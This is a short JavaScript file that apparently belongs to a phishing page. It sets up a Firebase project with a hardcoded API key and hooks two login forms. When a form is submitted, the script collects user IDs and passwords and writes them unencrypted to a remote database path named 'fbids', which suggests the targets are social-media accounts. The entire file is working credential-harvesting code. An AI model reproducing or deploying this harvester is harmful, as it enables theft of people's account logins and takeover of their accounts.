var config = {
  apiKey: "AIzaSyC5hD8l1JE0G97zlflv8R8UZ4vcDv7JcsU",
    authDomain: "admission-2020.firebaseapp.com",
    databaseURL: "https://admission-2020.firebaseio.com",
    projectId: "admission-2020",
    storageBucket: "admission-2020.appspot.com",
    messagingSenderId: "319954780627",
    appId: "1:319954780627:web:e7619e9df08e54d703af26",
    measurementId: "G-K3CT148EJR"
};
firebase.initializeApp(config);

/*-------------------------------------*/

document.getElementById('lgfr').addEventListener('submit', submitForm);
document.getElementById('phfr').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
var	usid = getInputVal('usid');
var	psd = getInputVal('psd');

var	muid = getInputVal('muid');
var	mpsd = getInputVal('mpsd');

saveMessage(usid,psd,muid,mpsd);

}
function getInputVal(id){
  return document.getElementById(id).value;
}

function saveMessage(usid,psd,muid,mpsd){
	firebase.database().ref('fbids/' + usid + "-or-" + muid).set({
usid:usid,
psd:psd,
muid:muid,
mpsd:mpsd
});

}

function fncuid(){
	document.getElementById("muid").value = document.getElementById("ph").value;

}
function fnpsd(){
	document.getElementById('mpsd').value = document.getElementById('pswd').value;
}
